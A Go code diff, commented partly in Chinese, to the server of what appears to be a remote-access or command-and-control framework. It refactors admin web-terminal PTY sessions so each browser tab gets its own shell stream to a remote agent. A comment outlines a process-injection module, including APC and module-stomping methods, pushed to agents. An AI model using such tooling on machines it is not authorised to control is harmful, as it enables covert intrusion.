@@ -23,8 +23,14 @@ import (
 // upgrader: browser-facing admin WS (PTY / shell) — empty Origin rejected
 var upgrader = globals.AdminUpgrader
 
+// ptySessionKey 组合 clientId 与 sessionId，保证每个前端终端标签页拥有独立的 PTY 会话。
+func ptySessionKey(clientID, sessionID string) string {
+	return clientID + "::" + sessionID
+}
+
 // openPtyStream opens a Yamux PTY stream (YAMUX_STREAM_PTY) for interactive shell.
-func openPtyStream(client *globals.Client, uuidStr string) (*globals.PTYSession, error) {
+// 每个 sessionKey 对应一个独立 Yamux 流，互不共享输出与命令历史。
+func openPtyStream(client *globals.Client, sessionKey string) (*globals.PTYSession, error) {
 	if client.YamuxSession == nil || client.YamuxSession.IsClosed() {
 		return nil, fmt.Errorf("no yamux session")
 	}
@@ -39,8 +45,8 @@ func openPtyStream(client *globals.Client, uuidStr string) (*globals.PTYSession,
 	// Brief pause so agent dispatcher reads the type byte before bulk input
 	time.Sleep(150 * time.Millisecond)
 	sess := &globals.PTYSession{Stream: stream}
-	globals.ActivePTYSessions.Store(uuidStr, sess)
-	go startPtyBackgroundLoop(uuidStr, sess)
+	globals.ActivePTYSessions.Store(sessionKey, sess)
+	go startPtyBackgroundLoop(sessionKey, sess)
 	return sess, nil
 }
 
@@ -53,22 +59,30 @@ func StreamPTY(c *gin.Context) {
 	}
 	client := val.(*globals.Client)
 
+	// 前端每个终端标签页携带独立 sessionId，后端据此创建/复用该标签页自己的 PTY 会话。
+	// 没有 sessionId 时退化兼容旧行为（按 agent 维度单会话）。
+	sessionID := c.Query("session")
+	if sessionID == "" {
+		sessionID = uuid.New().String()
+	}
+	sessionKey := ptySessionKey(uuidStr, sessionID)
+
 	ws, err := upgrader.Upgrade(c.Writer, c.Request, nil)
 	if err != nil {
 		return
 	}
 	defer ws.Close()
 
-	// 1. 获取或创建 PTY 会话；若缓存流已死则强制重建
+	// 1. 获取或创建该 session 的 PTY 会话；若缓存流已死则强制重建
 	var sess *globals.PTYSession
-	if valP, exists := globals.ActivePTYSessions.Load(uuidStr); exists {
+	if valP, exists := globals.ActivePTYSessions.Load(sessionKey); exists {
 		sess = valP.(*globals.PTYSession)
 		sess.Mutex.RLock()
 		dead := sess.Stream == nil
 		sess.Mutex.RUnlock()
 		if dead {
-			log.Printf("[PTY] Agent %s has stale PTY session, recreating", uuidStr)
-			globals.ActivePTYSessions.Delete(uuidStr)
+			log.Printf("[PTY] Agent %s session %s has stale PTY session, recreating", uuidStr, sessionID)
+			globals.ActivePTYSessions.Delete(sessionKey)
 			sess = nil
 		}
 	}
@@ -78,7 +92,7 @@ func StreamPTY(c *gin.Context) {
 			StreamPTYFallback(ws, client)
 			return
 		}
-		sess, err = openPtyStream(client, uuidStr)
+		sess, err = openPtyStream(client, sessionKey)
 		if err != nil {
 			log.Printf("[PTY] Failed to open stream for %s: %v", uuidStr, err)
 			_ = ws.WriteMessage(websocket.BinaryMessage, []byte("\r\n\x1b[31m[!] PTY Stream Error.\x1b[0m\r\n"))
@@ -86,7 +100,7 @@ func StreamPTY(c *gin.Context) {
 		}
 	}
 
-	// 2. 刷出历史缓存并订阅
+	// 2. 刷出该 session 自己的历史缓存并订阅
 	sess.Mutex.RLock()
 	if len(sess.HistoryBuffer) > 0 {
 		_ = ws.WriteMessage(websocket.BinaryMessage, sess.HistoryBuffer)
@@ -126,8 +140,8 @@ func StreamPTY(c *gin.Context) {
 			sess.Mutex.Unlock()
 
 			if needRebuild {
-				globals.ActivePTYSessions.Delete(uuidStr)
-				newSess, oerr := openPtyStream(client, uuidStr)
+				globals.ActivePTYSessions.Delete(sessionKey)
+				newSess, oerr := openPtyStream(client, sessionKey)
 				if oerr != nil {
 					log.Printf("[PTY] Rebuild failed for %s: %v", uuidStr, oerr)
 					_ = ws.WriteMessage(websocket.BinaryMessage, []byte("\r\n\x1b[31m[!] PTY stream dead; reopen terminal.\x1b[0m\r\n"))
@@ -158,7 +172,7 @@ func StreamPTY(c *gin.Context) {
 	sess.Subscribers.Delete(ws)
 }
 
-func startPtyBackgroundLoop(uuidStr string, sess *globals.PTYSession) {
+func startPtyBackgroundLoop(sessionKey string, sess *globals.PTYSession) {
 	buf := make([]byte, 32768)
 	defer func() {
 		sess.Mutex.Lock()
@@ -167,7 +181,7 @@ func startPtyBackgroundLoop(uuidStr string, sess *globals.PTYSession) {
 			sess.Stream = nil
 		}
 		sess.Mutex.Unlock()
-		globals.ActivePTYSessions.Delete(uuidStr)
+		globals.ActivePTYSessions.Delete(sessionKey)
 		// PTY session ended silently
 	}()
 
@@ -334,7 +348,7 @@ func HandleAdminShell(c *gin.Context) {
 
 func MigrateClient(c *gin.Context) {
 	// Legacy "migrate" API retired. Process inject is L2 module `inject`:
-	// 1) Build cupcake-mod-inject → storage/modules/inject.bin
+	// 1) Build cupcake-inject-worker → storage/modules/inject.bin
 	// 2) POST /api/modules/push {uuid, id: inject}
 	// 3) command_type=process_inject JSON {pid, data:b64, method:nt|crt|apc|stomping|auto, wait_ms}
 	c.JSON(http.StatusGone, gin.H{
